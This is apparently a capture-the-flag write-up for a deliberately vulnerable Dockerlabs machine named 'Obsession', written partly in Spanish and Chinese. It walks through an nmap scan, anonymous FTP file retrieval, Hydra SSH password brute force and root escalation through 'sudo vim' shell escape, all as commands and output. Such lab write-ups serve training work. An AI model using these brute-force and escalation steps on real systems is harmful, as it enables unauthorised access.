# Obsession

:::info

Autor: Juan

Dificultad: Muy Fácil

Fecha de creación: 25/06/2024

:::

## Deploy

```shell
randark@developer:~$ docker load -i obsession.tar 
42d3f8788282: Loading layer [==================================================>]  78.74MB/78.74MB
471e037e4e79: Loading layer [==================================================>]  348.7MB/348.7MB
66915ced895f: Loading layer [==================================================>]  54.79MB/54.79MB
3808d041be15: Loading layer [==================================================>]  3.679MB/3.679MB
Loaded image: obsession:latest
randark@developer:~$ docker run -d --name obsession obsession
ee34974848d83c0fd618ba6f4778bc34c7adadd9d6611d4f0054ab4c96f61842
randark@developer:~$ docker inspect obsession | jq ".[0].NetworkSettings.Networks"
{
  "bridge": {
    "IPAMConfig": null,
    "Links": null,
    "Aliases": null,
    "MacAddress": "02:42:ac:11:00:03",
    "DriverOpts": null,
    "NetworkID": "9d2490a4389002f4858a8c1d1da879e98d0132d8ac103765241ea802bcbd9616",
    "EndpointID": "b99fd25f0608b2574e1323c0abd8d32a8178081d00ce5c3bbb4cf42f743f1877",
    "Gateway": "172.17.0.1",
    "IPAddress": "172.17.0.3",
    "IPPrefixLen": 16,
    "IPv6Gateway": "",
    "GlobalIPv6Address": "",
    "GlobalIPv6PrefixLen": 0,
    "DNSNames": null
  }
}
```

## Scan

```shell
┌──(randark㉿kali)-[~]
└─$ sudo proxychains -q nmap --min-rate=5000 -sT -A -p- 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-04 17:07 CST
Nmap scan report for 172.17.0.2
Host is up (0.0022s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)
|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Russoski Coaching
```

## Port 21 FTP Anonymous

```shell
randark@developer:~$ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:randark): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
229 Entering Extended Passive Mode (|||51123|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        104          4096 Jun 18  2024 .
drwxr-xr-x    2 0        104          4096 Jun 18  2024 ..
-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
226 Directory send OK.
ftp> mget *
mget chat-gonza.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||63098|)
150 Opening BINARY mode data connection for chat-gonza.txt (667 bytes).
100% |*******************************************************************************************************************************************************************|   667      245.05 KiB/s    00:00 ETA
226 Transfer complete.
667 bytes received in 00:00 (189.46 KiB/s)
mget pendientes.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||19035|)
150 Opening BINARY mode data connection for pendientes.txt (315 bytes).
100% |*******************************************************************************************************************************************************************|   315      282.73 KiB/s    00:00 ETA
226 Transfer complete.
315 bytes received in 00:00 (235.18 KiB/s)
ftp> exit
221 Goodbye.
```

```plaintext title="chat-gonza.txt"
[16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
[16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
[16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
[21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
[21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
[22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy
```

```plaintext title="pendientes.txt"
1 Comprar el Voucher de la certificación eJPTv2 cuanto antes!

2 Aumentar el precio de mis asesorías online en la Web!

3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!

4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
  permisos habilitados que no son del todo seguros..
```

## Port 80 Directory

```shell
[22:45:08] 301 -  309B  - /backup  ->  http://172.17.0.2/backup/
[22:45:08] 200 -  453B  - /backup/
```

在其中得到一个txt文件

```plaintext title="http://172.17.0.2/backup/backup.txt"
Usuario para todos mis servicios: russoski (cambiar pronto!)
```

## Port 22 SSH Brute

尝试使用Hydra来进行爆破

```shell
┌──(randark㉿kali)-[~]
└─$ proxychains -q hydra -l russoski -P /usr/share/wordlists/rockyou.txt -V -I -f ssh://172.17.0.2
......
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
```

成功得到了SSH的凭据

```shell
┌──(randark㉿kali)-[~]
└─$ proxychains ssh russoski@172.17.0.2
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:10000  ...  172.17.0.2:22  ...  OK
russoski@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-51-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Jun 18 04:38:10 2024 from 172.17.0.1
russoski@13b39f2b1c3b:~$ whoami
russoski
```

## 提权

```shell
russoski@13b39f2b1c3b:~$ sudo /usr/bin/vim -c ':!/bin/bash'

root@13b39f2b1c3b:/home/russoski# whoami
root
```
